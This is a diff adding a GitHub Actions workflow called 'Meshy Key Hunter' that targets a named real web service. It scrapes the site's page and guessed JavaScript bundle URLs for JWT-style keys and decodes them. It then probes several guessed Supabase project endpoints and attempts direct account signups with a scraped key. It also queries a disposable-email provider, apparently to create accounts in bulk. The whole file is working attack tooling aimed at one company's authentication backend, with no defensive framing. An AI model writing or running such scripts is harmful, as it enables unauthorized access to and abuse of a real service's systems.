@@ -1,0 +1,89 @@
+name: Meshy Key Hunter
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'Target'
+        default: 'extract_keys'
+        required: false
+
+jobs:
+  extract-keys:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Extract Supabase keys from Meshy frontend
+        run: |
+          echo "=== MESHY KEY HUNTER ==="
+
+          # Fetch main page
+          echo "--- Fetching main page ---"
+          curl -s "https://www.meshy.ai" -o /tmp/meshy_main.html 2>/dev/null
+          grep -oP 'eyJ[A-Za-z0-9_/=-]+\.[A-Za-z0-9_/=-]+\.[A-Za-z0-9_/=-]+' /tmp/meshy_main.html | sort -u > /tmp/all_keys.txt
+          echo "Keys from main page: $(wc -l < /tmp/all_keys.txt)"
+          cat /tmp/all_keys.txt | while read key; do
+            echo "KEY: $key"
+            # Decode header
+            echo "$key" | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print('  ref:', d.get('ref','')); print('  role:', d.get('role',''))" 2>/dev/null || true
+          done
+
+          # Fetch JS bundles from CDN
+          echo "--- Fetching JS bundles ---"
+          for url in \
+            "https://cdn.meshy.ai/webapp-build-assets/main.js" \
+            "https://cdn.meshy.ai/webapp-build-assets/app.js" \
+            "https://cdn.meshy.ai/webapp-build-assets/_next/static/chunks/pages/index.js" \
+            "https://cdn.meshy.ai/webapp-build-assets/_next/static/chunks/main.js" \
+            "https://cdn.meshy.ai/webapp-build-assets/_next/static/chunks/app/page.js" \
+            "https://cdn.meshy.ai/webapp-build-assets/_next/static/chunks/app/layout.js" \
+            "https://assets.meshy.ai/js/app.js" \
+            "https://assets.meshy.ai/js/main.js" \
+            "https://www.meshy.ai/_next/static/chunks/pages/index.js" \
+            "https://www.meshy.ai/_next/static/chunks/main.js" \
+            "https://www.meshy.ai/_next/static/chunks/app/page.js"
+          do
+            echo "--- Fetching: $url ---"
+            curl -s "$url" -o /tmp/bundle.js 2>/dev/null
+            SIZE=$(wc -c < /tmp/bundle.js 2>/dev/null || echo 0)
+            echo "Size: $SIZE bytes"
+            if [ "$SIZE" -gt 100 ]; then
+              grep -oP 'eyJ[A-Za-z0-9_/=-]+\.[A-Za-z0-9_/=-]+\.[A-Za-z0-9_/=-]+' /tmp/bundle.js | sort -u >> /tmp/all_keys.txt
+            fi
+          done
+
+          # Deduplicate and decode all keys
+          echo "=== ALL UNIQUE KEYS ==="
+          sort -u /tmp/all_keys.txt | while read key; do
+            echo "=== KEY ==="
+            echo "$key"
+            HEADER=$(echo "$key" | cut -d'.' -f1 | base64 -d 2>/dev/null)
+            echo "Header: $HEADER"
+            PAYLOAD=$(echo "$key" | cut -d'.' -f2 | base64 -d 2>/dev/null)
+            echo "Payload: $PAYLOAD"
+          done
+
+          # Try to access Supabase directly
+          echo "--- Trying Supabase direct access ---"
+          for ref in ynfreclsyfgqnvgfpxcc ynfreclsxfgqnvgfpxcc ynfreclszfgqnvgfpxcc; do
+            echo "Trying ref: $ref"
+            RESP=$(curl -s "https://$ref.supabase.co/auth/v1/health" 2>/dev/null)
+            echo "Response: $RESP"
+            # Try to create account via Supabase direct
+            SIGNUP=$(curl -s -X POST "https://$ref.supabase.co/auth/v1/signup" \
+              -H "apikey: $(cat /tmp/all_keys.txt | head -1)" \
+              -H "Content-Type: application/json" \
+              -d '{"email":"test@test.com","password":"TestPass123"}' 2>/dev/null)
+            echo "Signup via direct: $SIGNUP"
+          done
+
+          # Check mail.tm domains
+          echo "--- Checking mail.tm ---"
+          DOMAINS=$(curl -s "https://api.mail.tm/domains" 2>/dev/null)
+          echo "Domains: $DOMAINS"
+
+          # Check auth.meshy.ai for new key
+          echo "--- Checking auth.meshy.ai ---"
+          curl -s "https://auth.meshy.ai/auth/v1/health" 2>/dev/null
+          echo ""
+
+          echo "=== DONE ==="
